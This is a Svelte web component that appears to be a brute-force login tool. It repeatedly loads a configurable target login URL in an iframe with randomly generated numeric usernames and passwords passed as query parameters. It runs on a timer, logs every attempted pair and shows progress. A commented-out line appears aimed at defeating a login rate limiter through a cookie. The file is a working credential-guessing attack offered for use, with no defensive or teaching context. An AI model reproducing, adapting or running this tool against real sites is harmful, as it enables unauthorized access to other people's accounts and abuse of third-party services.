<script>
  import "./app.css";
  //
  let trying;
  let counter = 0;
  // let website = "http://www.s.com/login";
  let website = "http://l.com/login";
  let frame;
  let url = "";

  let progressBar;
  let started = false;
  let pwd = "";
  let user = "";
  let cart = [];
  //
  let username = {
    chars: "0123456789",
    length: "9",
    start_chars: "2",
    end_chars: "",
  };
  //
  let password = {
    chars: "0123456789",
    length: "2",
    start_chars: "",
    end_chars: "",
  };

  //
  let setting = {
    timeout: 5,
    num_try: 100,
  };

  // fun

  function getRandom(chars, length, firstIndex = "", lastIndex = "") {
    let result;
    length = length - firstIndex.length - lastIndex.length;
    chars = chars.toString();
    result = firstIndex.toString();
    for (let x = 0; x < length; x++) {
      result += "" + chars.charAt(Math.floor(Math.random() * chars.length));
    }
    result += lastIndex.toString();
    // lastPwd = result;
    // console.log(length);
    return result;
  }

  function stopProgram() {
    if (trying != null) {
      started = false;
      clearInterval(trying);
      trying = null;
    }
  }

  function runProgram() {
    if (trying == null) {
      // btnStart.
      counter = 0;
      started = true;

      trying = setInterval(
        loginFromScript,
        parseInt(setting.timeout.toString()) * 1000
      );
    }
  }

  function loginFromScript() {
    if (counter < parseInt(setting.num_try.toString())) {
      user = getRandom(
        username.chars,
        username.length,
        username.start_chars,
        username.end_chars
      );

      pwd = getRandom(
        password.chars,
        password.length,
        password.start_chars,
        password.end_chars
      );
      url = website + "?username=" + user + "&&password=" + pwd;
      frame.src = url;
      cart = [{ u: user, p: pwd }, ...cart];
      // console.table(cart);
      console.debug(frame);
      // frame.document.cookie = "hot_blocker_counter = 1000;";
      progressBar.value = Math.floor((counter / setting.num_try) * 100);
      counter++;
      // alert(loginPageViewer.src);
    } else {
      stopProgram();
    }
  }

  $: {
    // console.log(frame.src === url);
  }
</script>

<svelte:head>
  <title>loginForm</title>
</svelte:head>
<!-- svelte-ignore a11y-label-has-associated-control -->

<main class="">
  <!--  -->

  <!-- panel -->
  <section
    class=" p-5 md:mx-20 my-10 rounded-lg "
    class:bg-primary-focus={!started}
    class:bg-secondary-focus={started}
  >
    <form on:submit|preventDefault class=" flex flex-col gap-5 items-center">
      <!--  -->

      <!-- website -->
      <div class=" w-full max-w-xs">
        <label class="label">
          <span class="label-text text-white font-bold capitalize">website</span
          >
        </label>
        <input
          type="text"
          placeholder="website"
          name="model"
          class="input w-full input-primary max-w-xs"
          bind:value={website}
        />
      </div>

      <!-- username -->
      <div class="border p-4 md:grid grid-cols-2 gap-y-10 w-full rounded-lg ">
        <!-- username chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >username chars</span
            >
          </label>
          <input
            type="text"
            placeholder="username chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={username.chars}
          />
        </div>

        <!-- username length -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >username length</span
            >
          </label>
          <input
            type="text"
            placeholder="username length"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={username.length}
          />
        </div>

        <!-- username start chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >username start chars</span
            >
          </label>
          <input
            type="text"
            placeholder="username start chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={username.start_chars}
          />
        </div>

        <!-- username end chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >username end chars</span
            >
          </label>
          <input
            type="text"
            placeholder="username end chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={username.end_chars}
          />
        </div>
      </div>

      <!-- password -->
      <div class="border p-4 md:grid grid-cols-2 gap-y-10 w-full rounded-lg">
        <!-- password chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >password chars</span
            >
          </label>
          <input
            type="text"
            placeholder="password chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={password.chars}
          />
        </div>

        <!-- password length -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >password length</span
            >
          </label>
          <input
            type="text"
            placeholder="password length"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={password.length}
          />
        </div>

        <!-- password start chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >password start chars</span
            >
          </label>
          <input
            type="text"
            placeholder="password start chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={password.start_chars}
          />
        </div>

        <!-- password end chars -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >password end chars</span
            >
          </label>
          <input
            type="text"
            placeholder="password end chars"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={password.end_chars}
          />
        </div>
      </div>

      <!-- setting -->
      <div class="border p-4 md:grid grid-cols-2 gap-y-10 w-full rounded-lg">
        <!-- timeout -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >timeout</span
            >
          </label>
          <input
            type="text"
            placeholder="timeout"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={setting.timeout}
          />
        </div>

        <!-- no. of try -->
        <div class=" w-full max-w-xs">
          <label class="label">
            <span class="label-text text-white font-bold capitalize"
              >no. of try</span
            >
          </label>
          <input
            type="text"
            placeholder="no. of try"
            name="model"
            class="input w-full input-primary max-w-xs"
            bind:value={setting.num_try}
          />
        </div>
      </div>

      <div class="btn-group">
        <button
          class="btn btn-error"
          class:loading={!started}
          on:click={() => {
            stopProgram();
          }}>stop</button
        >
        <button
          class="btn btn-success"
          class:loading={started}
          on:click={() => {
            runProgram();
          }}>start</button
        >
      </div>
      <!-- end -->
    </form>
  </section>

  <!-- log -->
  <section
    class="bg-gray-900 p-5 md:mx-20 md:text-4xl font-bold rounded-md flex flex-col  gap-5"
  >
    <div class="text-center">
      <h1>
        username:
        <span class="ml-3 font-extrabold">{user}</span>
      </h1>
    </div>

    <div class="text-center">
      <h1>
        password:
        <span class="ml-3 font-extrabold">{pwd}</span>
      </h1>
    </div>

    <div
      class="w-full bg-black text-base p-3 h-40 overflow-scroll flex flex-col justify-end"
    >
      <!--  -->

      {#each cart as line, i}
        {#if line.u || line.p}
          <h1>{i} - username: {line.u} - password: {line.p}</h1>
        {/if}
      {/each}
    </div>
  </section>

  <!-- view -->
  <section class=" mx-1 md:mx-10 my-5 flex flex-col gap-4 items-center">
    <!--  -->
    <div class="text-center flex flex-wrap gap-4 justify-center items-center">
      <div class="btn-group ">
        <button
          class="btn btn-error"
          class:loading={!started}
          class:btn-wide={started}
          on:click={() => {
            stopProgram();
          }}>stop</button
        >
        <button
          class="btn btn-success btn-wide"
          class:loading={started}
          class:btn-wide={!started}
          on:click={() => {
            runProgram();
          }}>start</button
        >
      </div>
    </div>

    <div class="flex flex-wrap gap-4 justify-center items-center ">
      <div class="">
        <progress bind:this={progressBar} max="100" class="rounded-xl" />
      </div>
      <h1 class="ml-5 text-3xl font-bold ">
        {progressBar ? progressBar.value : ""}%
      </h1>
    </div>

    <iframe title="" id="frame" bind:this={frame} class="w-full h-96" />
  </section>
</main>

<style>
  /*  */
</style>
